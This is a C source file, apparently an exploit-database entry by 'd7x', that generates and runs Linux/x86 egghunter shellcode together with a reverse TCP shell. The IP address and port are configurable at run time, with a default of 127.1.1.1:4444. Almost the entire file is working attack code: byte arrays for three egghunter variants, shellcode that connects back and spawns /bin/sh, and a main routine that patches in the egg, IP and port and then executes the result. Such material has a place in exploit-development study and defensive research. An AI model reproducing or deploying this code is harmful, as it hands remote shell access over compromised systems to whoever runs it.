# Exploit Title: Linux/x86 - Linux/x86 - Egghunter Reverse TCP Shell dynamic IP and port Shellcode
# Date: 18/07/2021
# Exploit Author: d7x
# Tested on: Ubuntu x86

/***
Linux/x86 - Egghunter Reverse TCP Shell Shellcode Generator with dynamic IP and port Shellcode
Author: d7x
https://d7x.promiselabs.net/
https://www.promiselabs.net/
***/

/*
	Egghunter payloads from skape modified to work on a modern up to date architecture
	For detailed information on the egghunter payloads and egghunter research refer to the original whitepaper by skape:
	Safely Searching Process Virtual Address Space http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
	Example usage of egghunters https://www.fuzzysecurity.com/tutorials/expDev/4.html
*/

/* Usage: $ gcc -fno-stack-protector -z execstack -o egghunter egghunter_shellcode.c
		      $ ./egghunter 2 3d7xC0D3 192.168.1.137 6666 # This will output AND execute the egghunter! (if you get a seg fault/core dumped error either your shellcode output contains null bytes or you have no idea what you are doing)
*/

#include <stdio.h>
#include <string.h>
#include <netdb.h>

void PrintShellcode(unsigned char* s);
void change_shellcode_bytes(unsigned char shellcode[], int offset, int n, unsigned char new[]);
unsigned char* ConvertStrToHex(unsigned char* s);

unsigned char egghunter[][200] = { \
{"\xBB\x90\x50\x90\x50\x31\xC9\xF7\xE1\x66\x81\xCA\xFF\x0F\x42\x60\x8D\x5A\x04\xB0\x21\xCD\x80\x3C\xF2\x61\x74\xED\x39\x1A\x75\xEE\x39\x5A\x04\x75\xE9\xFF\xE2"}, // access method - 39 bytes
{"\x31\xC9\x31\xD2\x66\x81\xCA\xFF\x0F\x42\x8D\x5A\x04\x6A\x21\x58\xCD\x80\x3C\xF2\x74\xEE\xB8\x90\x50\x90\x50\x89\xD7\xAF\x75\xE9\xAF\x75\xE6\xFF\xE7"}, //access revisited (fixed) - 37 bytes
{"\x31\xC9\x66\x81\xC9\xFF\x0F\x41\x6A\x43\x58\xCD\x80\x3C\xF2\x74\xF1\xB8\x90\x50\x90\x50\x89\xCF\xAF\x75\xEC\xAF\x75\xE9\xFF\xE7"} //sigaction method (fixed) - 32 bytes
};

/* unsigned char egghunter[] = \
"\x31\xC9\x66\x81\xC9\xFF\x0F\x41\x6A\x43\x58\xCD\x80\x3C\xF2\x74\xF1\xB8\x90\x50\x90\x50\x89\xCF\xAF\x75\xEC\xAF\x75\xE9\xFF\xE7"; //sigaction method (fixed) - 32 bytes
//"\x66\x81\xC9\xFF\x0F\x41\x6A\x43\x58\xCD\x80\x3C\xF2\x74\xF1\xB8\x90\x50\x90\x50\x89\xCF\xAF\x75\xEC\xAF\x75\xE9\xFF\xE7"; //sigaction method (original version by skape - 30 bytes)
//"\x31\xC9\x31\xD2\x66\x81\xCA\xFF\x0F\x42\x8D\x5A\x04\x6A\x21\x58\xCD\x80\x3C\xF2\x74\xEE\xB8\x90\x50\x90\x50\x89\xD7\xAF\x75\xE9\xAF\x75\xE6\xFF\xE7"; //access revisited (fixed) - 37 bytes
//"\x31\xD2\x66\x81\xCA\xFF\x0F\x42\x8D\x5A\x04\x6A\x21\x58\xCD\x80\x3C\xF2\x74\xEE\xB8\x90\x50\x90\x50\x89\xD7\xAF\x75\xE9\xAF\x75\xE6\xFF\xE7"; //access revisited (original version by skape) - 35 bytes
//"\xBB\x90\x50\x90\x50\x31\xC9\xF7\xE1\x66\x81\xCA\xFF\x0F\x42\x60\x8D\x5A\x04\xB0\x21\xCD\x80\x3C\xF2\x61\x74\xED\x39\x1A\x75\xEE\x39\x5A\x04\x75\xE9\xFF\xE2"; // access method - 39 bytes
*/

/* Reverse TCP Shell:
egg \x90\x50\x90\x50\x90\x50\x90\x50
127.1.1.1 4444 */
unsigned char shellcode[] = \
"\x90\x50\x90\x50\x90\x50\x90\x50\x31\xc0\x31\xdb\xb0\x66\xb3\x01\x31\xd2\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x03\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc9\x31\xc0\xb0\x3f\x89\xf3\xcd\x80\xfe\xc1\x66\x83\xf9\x02\x7e\xf0\x31\xc0\x50\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"; //IP address at eggsize + 26th byte; Port at eggsize + 32nd byte

int eggsize = 4; //default

main(int argc, char *argv[])
{

  if (argc < 2)
  {
	  printf("Usage: %s <egghunter> [egg] [IP] [Port]", argv[0]);
  	printf("\nExample: %s 0 0x9050 127.1.1 4444\n"
		   			"%s 1 AABB 127.1.1.1 4444\n"
  					"%s 2 AABBCCDD 127.1.1.1 4444\n"
  					"%s 2 3d7xC0D3 127.1.1.1 4444\n", argv[0], argv[0], argv[0], argv[0]);
  	printf("\n\nDefault egg: \\x90\\x50\\x90\\x50 (push eax, nop, push eax, nop)"
  			"\nDefault shellcode IP and port 127.1.1.1:4444");
  	printf("\n\nAvailable egghunters:"
  		   "\n0 - access method (39 bytes), requires executable egg"
  		   "\n1 - access revisited (37 bytes)"
  		   "\n2 - sigaction (32 bytes)\n"
  	);

  	return 0;
  }

  int eh = atoi((char *)argv[1]);
  if (eh < 0 || eh > 2)
  {
  	printf("Invalid Egghunter: %d!\n", eh);

  	return 0;
  }

  if (argc > 2)
  {
  	if (argv[2][0] == '0' && argv[2][1] == 'x') argv[2] += 2;

  	if (strlen(argv[2]) != 4 && strlen(argv[2]) != 8)
  	{
  	  printf("Egg has to be at least 4 or exactly 8 bytes!"
  	  		"\nExample eggs: 9050, 9060, C0D3,"
  	  		"\n				d7xC0D3D, 3d7xC0D3, 3d7xC0D3, 7d7xC0D3"
  	  		"\n"
  	  );

  	  return 0;
    }

    int i;
    for (i = 0; i < strlen(argv[2]); i+=2)
      if (argv[2][i] == '0' && argv[2][i+1] == '0')
      {
        printf("No null bytes!\n");
        return 0;
      }

  }

  /* change egg if provided */
  int eh_offset = 1;				        // default offset for access method (39 bytes)
  if (eh == 1) eh_offset = 23;		  // offset for access revisited (37 bytes)
  else if (eh ==2) eh_offset = 18;	// offset for sigaction (32 bytes)

  if (argc > 2) {

  	unsigned char* new_egg = argv[2], *s, *tmp;
  	printf("Changing egg to %s...\n", new_egg);

  	s = ConvertStrToHex(argv[2]);
  	tmp = s;


  	//fill buffer - 4 bytes of [egg], then concatenate additional 4 bytes of [egg] (8 bytes)
  	strcat(tmp, s);
  	if (strlen(argv[2]) == 4)
  		strcat(tmp, tmp);

  	//PrintShellcode(s);
  	change_shellcode_bytes(egghunter[eh], eh_offset, eh_offset+3, s);
  	change_shellcode_bytes(shellcode, 0, 7, tmp);
  }

  printf("Egghunter %d, size %d\n", eh, strlen(egghunter[eh] ) );
  printf("Egghunter shellcode: \n");
  PrintShellcode(egghunter[eh]);

  printf("\nReverse TCP Shellcode (%d bytes): \n", strlen(shellcode));

  // change shellcode IP address
  unsigned char *s2 = shellcode;
  if (argc > 3)
  {
	  printf("%s\n", argv[3]);

  	// convert IP address to binary representation and store in ipaddr.sin_addr.s_addr
    struct sockaddr_in ipaddr;
    inet_aton(argv[3], &ipaddr.sin_addr.s_addr);


    int i = eggsize*2+26, a;
    int e = i+3;

    for (i, a = 0; i <= e; i++, a+=8)
	  {
		  s2[i] = (ipaddr.sin_addr.s_addr >> a) & 0xff ;
		  printf("Byte %d: %.02x\n", i, s2[i]);
	  }

  }

  // change shellcode Port
  int port = 4444; //0x115c - default

  if (argc > 4)
  {
  	port = atoi(argv[4]);
	  unsigned int p1 = (port >> 8) & 0xff;
	  unsigned int p2 = port & 0xff;
   	s2[eggsize*2+32] = (unsigned char){p1};
    s2[eggsize*2+33] = (unsigned char){p2};
  }

  printf("Port %d\n", port);
  PrintShellcode(s2);

  printf("\n");
  int (*ret)() = (int(*)())egghunter[eh];

  ret();

}

void change_shellcode_bytes(unsigned char* shellcode_n, int offset, int n, unsigned char* new)
{
	int i, a;
  for (i = offset, a = 0; i <= n; i++, a++)
		shellcode_n[i] = (unsigned char) {new[a]};
		// printf("Byte %d: %.02x\n", i, shellcode_n[i]);
}

void PrintShellcode(unsigned char* s)
{
	printf("\"");
	while (*s)
		printf("\\x%.02x", (unsigned int) *s++);

	printf("\"\n");
}

unsigned char* ConvertStrToHex(unsigned char* s)
{
	if (s[0] == '0' && s[1] == 'x') s += 2;
	unsigned char buf[strlen(s)/2];
	buf[strlen(s)/2] = '\0';

	int len = sizeof(buf);
	size_t count;

	for (count = 0; count < len; count++) {
		sscanf(s, "%2hhx", &buf[count]);
		s += 2;
	}

	return buf;
}